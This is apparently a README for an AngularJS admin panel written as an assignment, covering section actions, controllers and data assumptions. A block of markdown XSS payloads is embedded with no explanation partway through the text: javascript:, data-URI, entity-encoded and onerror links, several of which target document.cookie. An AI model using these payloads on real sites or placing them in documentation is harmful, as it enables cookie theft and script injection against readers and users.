# Almabase Assignment Admin Panel
## Individual Section 
In each section, the fields are shown and these fields can be removed by clicking respective the cross mark.<br>
<!-- Actions<br> -->
	* Move 
		- Section becomes movable and you can position it. 	To remove movability, click move again.
	* Edit
		- You can change the position of the section.
	* Delete
		- You can delete the section and whole data will be lost.
	* Add Fields
		- You can add the fields to section.

[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
![a](javascript:prompt(document.cookie))\
<javascript:prompt(document.cookie)>  
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>  
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
![a'"`onerror=prompt(document.cookie)](x)\
[citelol]: (javascript:prompt(document.cookie))
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[test](javascript://%0d%0aprompt(1))
[test](javascript://%0d%0aprompt(1);com)

## Controllers 
* `MainCtrl` (Main Controller)
    * `headerCtrl` (Header Controller)
		For future use
    * `sectionCtrl` (Section Controller)
		For Individual Section activities.
		* `sectionListCtrl` (Section List Controller)
			- List of all the sections.
		* `addSectionsCtrl` (Add Sections Controller)
			- For adding the section.


## Assumptions
* Data is hard Coded.
	- see the `loadData` method in `sectionctrl`.
	- To dynamically load the data, we need to add the server api call to this method. 
* To save the data
	- At any time the data is present in scope variables
		* Section Data
			- present in the `$scope.sections` variable
		* Fields Data
			- present in the `$scope.fields` variable
	- To send the data to server, Just a call is needed which will send data to server
		- Individual Section attributes
			- id
			- Name
			- Fields (Array)
		- Fields Attributes
			- id
			- Name
			- Property
* Don't Refresh the Webpage as No server Backend calls are made.You will loose all the data.
